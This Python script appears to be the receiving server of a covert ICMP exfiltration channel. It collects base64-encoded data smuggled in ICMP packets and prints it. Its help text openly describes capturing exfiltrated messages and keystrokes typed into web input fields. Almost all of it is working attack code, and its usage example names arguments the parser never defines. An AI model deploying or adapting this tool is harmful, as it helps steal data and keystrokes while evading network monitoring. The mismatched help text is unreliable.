#!/usr/bin/python3

import os, socket, argparse, logging
from channel import ICMP_Channel_Server, Channel_Transport

description = '''Start server to receive exfiltrated messages on localhost:
\tpython3 server.py -b 127.0.0.1
Start server to receive key strokes inside any input field:
\tpython3 server.py freq_en.json -e input -a value'''

# Initialize argument parsing
class CustomFormatter(argparse.ArgumentDefaultsHelpFormatter, argparse.RawDescriptionHelpFormatter): pass
parser = argparse.ArgumentParser(
    epilog=description,
    formatter_class=CustomFormatter,
    description="Exfiltration server for ICMP channel")
parser.add_argument("-b", "--bind", type=str, default="0.0.0.0", help="Bind to this IP")
parser.add_argument("-e", "--encoding", type=str, default="utf-8", help="Encoding to use")
parser.add_argument("-i", "--identifier", type=int, default=1, help="Identifer for ICMP packets shared between client and server (1-65535)")
parser.add_argument("-v", "--verbose", action='store_true', help="Increase output verbosity")
args = parser.parse_args()

# Initialize logging
logger = logging.getLogger(__name__)
logger.setLevel(args.verbose and logging.DEBUG or logging.INFO)
formatter = logging.Formatter('%(levelname)s: [SERVER] %(message)s')
handler = logging.StreamHandler()
handler.setFormatter(formatter)
logger.addHandler(handler)


# Step 1: Initialize ICMP channel
icmp = ICMP_Channel_Server(logger, args.bind)
icmp.set_icmp_identifier(args.identifier)

# Step 2: Set up transport encoding
transport = Channel_Transport.Base64(args.encoding)
icmp.set_transport(transport)

# Step 3: Receive size of data
expected_size = int.from_bytes(icmp.receive_data(), "big")
logger.debug(f"Expecting {expected_size} bytes")

# Step 4: Receive data until expected size is reached
data = icmp.receive_data_size(expected_size)

logger.info(f"Received {len(data)} bytes:  \n\n{data}\n\n")
icmp.close()
